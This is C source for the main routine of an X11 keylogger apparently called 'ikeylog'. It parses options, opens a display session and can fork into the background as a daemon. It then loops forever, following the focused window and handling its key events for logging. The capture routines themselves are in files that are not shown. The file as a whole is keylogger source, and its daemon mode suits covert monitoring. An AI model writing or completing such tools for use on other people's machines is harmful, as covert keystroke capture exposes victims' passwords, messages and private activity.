#include <X11/Xlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <errno.h>
#include "signal.h"
#include "display.h"
#include "ikeylog.h"
#include "args.h"


/* Global stuff */
ikeylog_opts *opts;
X11LogSess *sess;


/**
 * Main function: Get arguments, do syntax check and then start logging.
 */
int main(int argc, char** argv)
{
    int pid;
    
    // Get arguments 
    if(!(opts = args_check(argc, argv))) {
        fprintf(stderr, "Couldn't parse arguments.\n");
        return -1;
    }
    
    /* Set global structure pointer */
    g_ikeylog_opts = opts; 
    
    /* Initialize display */
    sess = display_init();
    
    /* Focus on certain window and start logging */
    if (sess == NULL) {
        fprintf(stderr, "Something went wrong. Aborting.\n");
        exit(EXIT_FAILURE);
    }
    
    /* Daemonize process ? */
    if(g_ikeylog_opts->daemon > 0) {
        if((pid = fork()) < 0)
            M_DISPLAY_ERROR;
            
        /* Exit the parent process */
        if(pid > 0) 
            exit(EXIT_SUCCESS);
    }
    
    // TODO: Implement this properly 
    // Catch signals for proper exit
    // (void) signal(SIGINT, signal_handler);
    
    // Start logging
    while (1) {
        if (sess->focuswin == None)
            display_focus(sess);
        else
            display_handle_event(sess);
    }
     
    return EXIT_SUCCESS;
}
